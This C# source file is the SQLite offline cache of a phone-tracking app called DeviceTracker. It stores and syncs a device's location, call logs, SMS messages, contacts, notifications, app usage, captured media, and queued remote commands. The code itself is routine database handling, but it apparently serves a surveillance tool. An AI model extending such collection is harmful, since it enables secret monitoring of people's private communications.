using DeviceTracker.Models;
using SQLite;

namespace DeviceTracker.Services;

/// <summary>
/// قاعدة البيانات المحلية (SQLite) للتخزين المؤقت عند انقطاع الإنترنت.
///
/// استراتيجية Offline-First:
/// 1. جميع البيانات تُخزن محلياً أولاً (حتى مع وجود الإنترنت)
/// 2. عند انقطاع الشبكة ← البيانات تبقى آمنة في SQLite
/// 3. بمجرد عودة الاتصال ← تُرفع تلقائياً (عبر SyncService)
/// 4. بعد الرفع الناجح ← تُوسم السجلات بـ IsSynced = true
/// 5. السجلات المُرفعة والأقدم من 7 أيام تُحذف تلقائياً
/// </summary>
public sealed class LocalDatabaseService : IDisposable
{
    private SQLiteAsyncConnection? _db;
    private readonly string _dbPath;

    private const int MaxFailedAttempts = 5;
    private const int RetentionDays = 7;

    public LocalDatabaseService()
    {
        _dbPath = Path.Combine(
            FileSystem.AppDataDirectory,
            "devicetracker_offline.db3");
    }

    /// <summary>
    /// فتح الاتصال بقاعدة SQLite (مع إنشاء الجداول تلقائياً)
    /// </summary>
    private async Task<SQLiteAsyncConnection> GetConnectionAsync()
    {
        if (_db is not null)
            return _db;

        _db = new SQLiteAsyncConnection(_dbPath,
            SQLiteOpenFlags.ReadWrite |
            SQLiteOpenFlags.Create |
            SQLiteOpenFlags.SharedCache);

        await _db.CreateTableAsync<LocationRecord>();
        await _db.CreateTableAsync<DeviceStateRecord>();
        await _db.CreateTableAsync<InstalledAppRecord>();
        await _db.CreateTableAsync<CallLogRecord>();
        await _db.CreateTableAsync<SmsRecord>();
        await _db.CreateTableAsync<ContactRecord>();
        await _db.CreateTableAsync<NotificationLogRecord>();
        await _db.CreateTableAsync<AppUsageRecord>();
        await _db.CreateTableAsync<MediaCaptureRecord>();
        await _db.CreateTableAsync<Models.Command.RemoteCommand>();

        return _db;
    }

    // ================================================================
    //  دوال التعامل مع سجلات الموقع (LocationRecords)
    // ================================================================

    /// <summary>
    /// إضافة سجل موقع جديد إلى SQLite
    /// </summary>
    public async Task<int> SaveLocationAsync(LocationRecord record)
    {
        try
        {
            var db = await GetConnectionAsync();
            return await db.InsertAsync(record);
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[LocalDB] SaveLocation error: {ex.Message}");
            return 0;
        }
    }

    /// <summary>
    /// جلب جميع سجلات الموقع التي لم تُرفع بعد إلى السيرفر
    /// مع تجاهل السجلات التي تجاوزت حد المحاولات الفاشلة
    /// </summary>
    /// <param name="max">الحد الأقصى للسجلات المسحوبة</param>
    public async Task<List<LocationRecord>> GetUnsyncedLocationsAsync(int max = 50)
    {
        try
        {
            var db = await GetConnectionAsync();
            return await db.Table<LocationRecord>()
                .Where(r => !r.IsSynced && r.FailedAttempts < MaxFailedAttempts)
                .OrderBy(r => r.CapturedAt)
                .Take(max)
                .ToListAsync();
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[LocalDB] GetUnsyncedLocations error: {ex.Message}");
            return new List<LocationRecord>();
        }
    }

    /// <summary>
    /// تعداد السجلات غير المرفوعة من الموقع
    /// </summary>
    public async Task<int> GetPendingLocationCountAsync()
    {
        try
        {
            var db = await GetConnectionAsync();
            return await db.Table<LocationRecord>()
                .Where(r => !r.IsSynced && r.FailedAttempts < MaxFailedAttempts)
                .CountAsync();
        }
        catch
        {
            return 0;
        }
    }

    // ================================================================
    //  دوال التعامل مع سجلات حالة الجهاز (DeviceStateRecords)
    // ================================================================

    /// <summary>
    /// إضافة سجل حالة جهاز جديد
    /// </summary>
    public async Task<int> SaveDeviceStateAsync(DeviceStateRecord record)
    {
        try
        {
            var db = await GetConnectionAsync();
            return await db.InsertAsync(record);
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[LocalDB] SaveState error: {ex.Message}");
            return 0;
        }
    }

    /// <summary>
    /// جلب سجلات الحالة غير المرفوعة
    /// </summary>
    public async Task<List<DeviceStateRecord>> GetUnsyncedStatesAsync(int max = 50)
    {
        try
        {
            var db = await GetConnectionAsync();
            return await db.Table<DeviceStateRecord>()
                .Where(r => !r.IsSynced && r.FailedAttempts < MaxFailedAttempts)
                .OrderBy(r => r.CapturedAt)
                .Take(max)
                .ToListAsync();
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[LocalDB] GetUnsyncedStates error: {ex.Message}");
            return new List<DeviceStateRecord>();
        }
    }

    // ================================================================
    //  دوال التعامل مع سجلات التطبيقات (InstalledAppRecords)
    // ================================================================

    /// <summary>
    /// إضافة سجلات تطبيقات مثبتة (قد تكون مجموعة)
    /// </summary>
    public async Task<int> SaveInstalledAppsAsync(IEnumerable<InstalledAppRecord> apps)
    {
        try
        {
            var db = await GetConnectionAsync();
            return await db.InsertAllAsync(apps);
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[LocalDB] SaveApps error: {ex.Message}");
            return 0;
        }
    }

    /// <summary>
    /// جلب سجلات التطبيقات غير المرفوعة
    /// </summary>
    public async Task<List<InstalledAppRecord>> GetUnsyncedAppsAsync(int max = 50)
    {
        try
        {
            var db = await GetConnectionAsync();
            return await db.Table<InstalledAppRecord>()
                .Where(r => !r.IsSynced && r.FailedAttempts < MaxFailedAttempts)
                .OrderBy(r => r.CapturedAt)
                .Take(max)
                .ToListAsync();
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[LocalDB] GetUnsyncedApps error: {ex.Message}");
            return new List<InstalledAppRecord>();
        }
    }

    // ================================================================
    //  دوال سجلات المكالمات (CallLogRecords)
    // ================================================================

    public async Task<int> SaveCallLogsAsync(IEnumerable<CallLogRecord> records)
    {
        try
        {
            var db = await GetConnectionAsync();
            return await db.InsertAllAsync(records);
        }
        catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[LocalDB] SaveCallLogs error: {ex.Message}"); return 0; }
    }

    public async Task<List<CallLogRecord>> GetUnsyncedCallLogsAsync(int max = 100)
    {
        try { var db = await GetConnectionAsync(); return await db.Table<CallLogRecord>().Where(r => !r.IsSynced && r.FailedAttempts < MaxFailedAttempts).Take(max).ToListAsync(); }
        catch { return new List<CallLogRecord>(); }
    }

    // ================================================================
    //  دوال الرسائل النصية (SmsRecords)
    // ================================================================

    public async Task<int> SaveSmsMessagesAsync(IEnumerable<SmsRecord> records)
    {
        try { var db = await GetConnectionAsync(); return await db.InsertAllAsync(records); }
        catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[LocalDB] SaveSms error: {ex.Message}"); return 0; }
    }

    public async Task<List<SmsRecord>> GetUnsyncedSmsAsync(int max = 100)
    {
        try { var db = await GetConnectionAsync(); return await db.Table<SmsRecord>().Where(r => !r.IsSynced && r.FailedAttempts < MaxFailedAttempts).Take(max).ToListAsync(); }
        catch { return new List<SmsRecord>(); }
    }

    // ================================================================
    //  دوال جهات الاتصال (ContactRecords)
    // ================================================================

    public async Task<int> SaveContactsAsync(IEnumerable<ContactRecord> records)
    {
        try { var db = await GetConnectionAsync(); return await db.InsertAllAsync(records); }
        catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[LocalDB] SaveContacts error: {ex.Message}"); return 0; }
    }

    public async Task<List<ContactRecord>> GetUnsyncedContactsAsync(int max = 200)
    {
        try { var db = await GetConnectionAsync(); return await db.Table<ContactRecord>().Where(r => !r.IsSynced && r.FailedAttempts < MaxFailedAttempts).Take(max).ToListAsync(); }
        catch { return new List<ContactRecord>(); }
    }

    // ================================================================
    //  دوال سجلات الإشعارات (NotificationLogRecords)
    // ================================================================

    public async Task<int> SaveNotificationAsync(NotificationLogRecord record)
    {
        try { var db = await GetConnectionAsync(); return await db.InsertAsync(record); }
        catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[LocalDB] SaveNotif error: {ex.Message}"); return 0; }
    }

    public async Task<List<NotificationLogRecord>> GetUnsyncedNotificationsAsync(int max = 100)
    {
        try { var db = await GetConnectionAsync(); return await db.Table<NotificationLogRecord>().Where(r => !r.IsSynced).Take(max).ToListAsync(); }
        catch { return new List<NotificationLogRecord>(); }
    }

    // ================================================================
    //  دوال إحصائيات استخدام التطبيقات (AppUsageRecords)
    // ================================================================

    public async Task<int> SaveAppUsageAsync(IEnumerable<AppUsageRecord> records)
    {
        try { var db = await GetConnectionAsync(); return await db.InsertAllAsync(records); }
        catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[LocalDB] SaveAppUsage error: {ex.Message}"); return 0; }
    }

    public async Task<List<AppUsageRecord>> GetUnsyncedAppUsageAsync(int max = 100)
    {
        try { var db = await GetConnectionAsync(); return await db.Table<AppUsageRecord>().Where(r => !r.IsSynced).Take(max).ToListAsync(); }
        catch { return new List<AppUsageRecord>(); }
    }

    // ================================================================
    //  دوال الوسائط (MediaCaptureRecords)
    // ================================================================

    public async Task<int> SaveMediaCaptureAsync(MediaCaptureRecord record)
    {
        try { var db = await GetConnectionAsync(); return await db.InsertAsync(record); }
        catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[LocalDB] SaveMedia error: {ex.Message}"); return 0; }
    }

    public async Task<List<MediaCaptureRecord>> GetUnsyncedMediaAsync(int max = 20)
    {
        try { var db = await GetConnectionAsync(); return await db.Table<MediaCaptureRecord>().Where(r => !r.IsSynced && !r.IsUploaded).Take(max).ToListAsync(); }
        catch { return new List<MediaCaptureRecord>(); }
    }

    // ================================================================
    //  دوال الأوامر عن بعد (RemoteCommand)
    // ================================================================

    public async Task<int> SaveCommandAsync(Models.Command.RemoteCommand cmd)
    {
        try { var db = await GetConnectionAsync(); return await db.InsertOrReplaceAsync(cmd); }
        catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[LocalDB] SaveCmd error: {ex.Message}"); return 0; }
    }

    public async Task<List<Models.Command.RemoteCommand>> GetPendingCommandsAsync()
    {
        try { var db = await GetConnectionAsync(); return await db.Table<Models.Command.RemoteCommand>().Where(c => !c.IsProcessed).ToListAsync(); }
        catch { return new List<Models.Command.RemoteCommand>(); }
    }

    public async Task MarkCommandProcessedAsync(Models.Command.RemoteCommand cmd)
    {
        cmd.IsProcessed = true;
        await MarkAsSyncedAsync(cmd);
    }

    // ================================================================
    //  دوال تحديث حالة المزامنة
    // ================================================================

    /// <summary>
    /// تحديث حالة السجل بعد نجاح المزامنة (IsSynced = true)
    /// </summary>
    public async Task MarkAsSyncedAsync<T>(T record) where T : class
    {
        try
        {
            var db = await GetConnectionAsync();
            await db.UpdateAsync(record);
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[LocalDB] MarkSynced error: {ex.Message}");
        }
    }

    /// <summary>
    /// زيادة عداد المحاولات الفاشلة (بعد فشل الرفع)
    /// </summary>
    public async Task IncrementFailedAttemptsAsync<T>(T record) where T : class
    {
        try
        {
            var db = await GetConnectionAsync();
            await db.UpdateAsync(record);
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[LocalDB] IncrementFailed error: {ex.Message}");
        }
    }

    /// <summary>
    /// تحديث حالة سجل موقع بعد المزامنة الناجحة
    /// </summary>
    public async Task MarkLocationSyncedAsync(LocationRecord record)
    {
        record.IsSynced = true;
        await MarkAsSyncedAsync(record);
    }

    /// <summary>
    /// تحديث حالة سجل جهاز بعد المزامنة الناجحة
    /// </summary>
    public async Task MarkStateSyncedAsync(DeviceStateRecord record)
    {
        record.IsSynced = true;
        await MarkAsSyncedAsync(record);
    }

    /// <summary>
    /// تحديث حالة سجل تطبيق بعد المزامنة الناجحة
    /// </summary>
    public async Task MarkAppSyncedAsync(InstalledAppRecord record)
    {
        record.IsSynced = true;
        await MarkAsSyncedAsync(record);
    }

    // ================================================================
    //  دوال الصيانة والتنظيف
    // ================================================================

    /// <summary>
    /// حذف السجلات المرفوعة التي مضى عليها أكثر من RetentionDays
    /// للحفاظ على حجم قاعدة البيانات صغيراً
    /// </summary>
    public async Task<int> CleanOldSyncedRecordsAsync()
    {
        try
        {
            var db = await GetConnectionAsync();
            var cutoff = DateTime.UtcNow.AddDays(-RetentionDays);
            var total = 0;

            total += await db.ExecuteAsync("DELETE FROM location_records WHERE IsSynced = 1 AND CapturedAt < ?", cutoff);
            total += await db.ExecuteAsync("DELETE FROM device_state_records WHERE IsSynced = 1 AND CapturedAt < ?", cutoff);
            total += await db.ExecuteAsync("DELETE FROM installed_apps WHERE IsSynced = 1 AND CapturedAt < ?", cutoff);
            total += await db.ExecuteAsync("DELETE FROM call_logs WHERE IsSynced = 1 AND CapturedAt < ?", cutoff);
            total += await db.ExecuteAsync("DELETE FROM sms_messages WHERE IsSynced = 1 AND CapturedAt < ?", cutoff);
            total += await db.ExecuteAsync("DELETE FROM contacts WHERE IsSynced = 1 AND CapturedAt < ?", cutoff);
            total += await db.ExecuteAsync("DELETE FROM notification_logs WHERE IsSynced = 1 AND CapturedAt < ?", cutoff);
            total += await db.ExecuteAsync("DELETE FROM app_usage_stats WHERE IsSynced = 1 AND CapturedAt < ?", cutoff);
            total += await db.ExecuteAsync("DELETE FROM media_captures WHERE IsSynced = 1 AND CapturedAt < ?", cutoff);
            return total;
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[LocalDB] CleanOld error: {ex.Message}");
            return 0;
        }
    }

    /// <summary>
    /// إجمالي عدد السجلات غير المرفوعة (للوحة التحكم)
    /// </summary>
    public async Task<int> GetPendingSyncCountAsync()
    {
        try
        {
            var db = await GetConnectionAsync();
            var locCount = await db.Table<LocationRecord>()
                .Where(r => !r.IsSynced && r.FailedAttempts < MaxFailedAttempts)
                .CountAsync();
            var stateCount = await db.Table<DeviceStateRecord>()
                .Where(r => !r.IsSynced && r.FailedAttempts < MaxFailedAttempts)
                .CountAsync();
            var appsCount = await db.Table<InstalledAppRecord>()
                .Where(r => !r.IsSynced && r.FailedAttempts < MaxFailedAttempts)
                .CountAsync();
            return locCount + stateCount + appsCount;
        }
        catch
        {
            return 0;
        }
    }

    /// <summary>
    /// حذف جميع البيانات المحلية (إعادة تعيين)
    /// </summary>
    public async Task ClearAllAsync()
    {
        try
        {
            var db = await GetConnectionAsync();
            await db.DeleteAllAsync<LocationRecord>();
            await db.DeleteAllAsync<DeviceStateRecord>();
            await db.DeleteAllAsync<InstalledAppRecord>();
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[LocalDB] ClearAll error: {ex.Message}");
        }
    }

    /// <summary>
    /// الحصول على حجم قاعدة البيانات بالبايت
    /// </summary>
    public long GetDatabaseSize()
    {
        try
        {
            if (File.Exists(_dbPath))
                return new FileInfo(_dbPath).Length;
            return 0;
        }
        catch
        {
            return 0;
        }
    }

    public void Dispose()
    {
        _db?.CloseAsync().ConfigureAwait(false);
    }
}
